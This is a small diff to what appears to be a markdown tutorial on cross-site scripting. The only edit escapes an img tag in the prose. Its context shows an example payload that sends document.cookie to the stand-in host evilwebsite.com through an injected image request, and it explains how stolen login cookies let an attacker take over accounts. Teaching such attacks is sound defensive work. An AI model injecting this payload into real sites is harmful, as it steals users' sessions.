@@ -571,7 +571,7 @@ Attackers can use edited cookies, JSON objects with immediately-invoked function
 <script>document.writeln('<img src="evilwebsite.com/cookie.png?cookie=" + document.cookie + "</img>");</script>
 ```
 
-What’s happening in the above code is that the <script> tag can be used because of an XSS vulnerability, and then document.writeln() will run whenever someone browses the page, and the results will be different for each user. In this case, document.writeln() will add an <img> tag to the page in order to show an image. But an attacker could even use a transparent 1x1 pixel PNG so that you don’t even see the image. ?cookie means you are sending a query string to evilwebsite.com, rather than just getting an image. document.cookie is the cookie. 
+What’s happening in the above code is that the <script> tag can be used because of an XSS vulnerability, and then document.writeln() will run whenever someone browses the page, and the results will be different for each user. In this case, document.writeln() will add an \<img> tag to the page in order to show an image. But an attacker could even use a transparent 1x1 pixel PNG so that you don’t even see the image. ?cookie means you are sending a query string to evilwebsite.com, rather than just getting an image. document.cookie is the cookie. 
 
 All an attacker would have to do is look through their server logs and see requests for evilwebsite.com/cookie.png and look at the query string in order to steal the login cookies, which they can then use to log in to other people’s accounts.
 
